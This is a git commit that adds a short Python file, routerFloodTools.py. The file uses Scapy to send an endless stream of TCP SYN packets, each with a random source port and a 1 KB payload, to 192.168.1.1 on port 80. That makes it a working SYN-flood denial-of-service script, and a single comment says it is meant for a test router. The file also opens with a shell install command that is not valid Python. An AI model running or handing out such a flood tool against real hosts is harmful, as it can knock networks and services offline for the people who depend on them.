6956dae222415f4329d113cdb6fd68d207dacf5a
Emre İşlek <95578438+islek-emre@users.noreply.github.com>
2022-07-10 12:40:23 +0300

    Add files via upload

---
+++ routerFloodTools.py
@@ -0,0 +1,14 @@
+pip3 install scapy
+from scapy.all import *
+
+target_ip = "192.168.1.1" 
+#(should be a testing router/firewall)
+
+target_port = 80
+
+ip = IP(dst=target_ip)
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+raw = Raw(b"X"*1024)
+p = ip / tcp / raw
+send(p, loop=1, verbose=0)
+
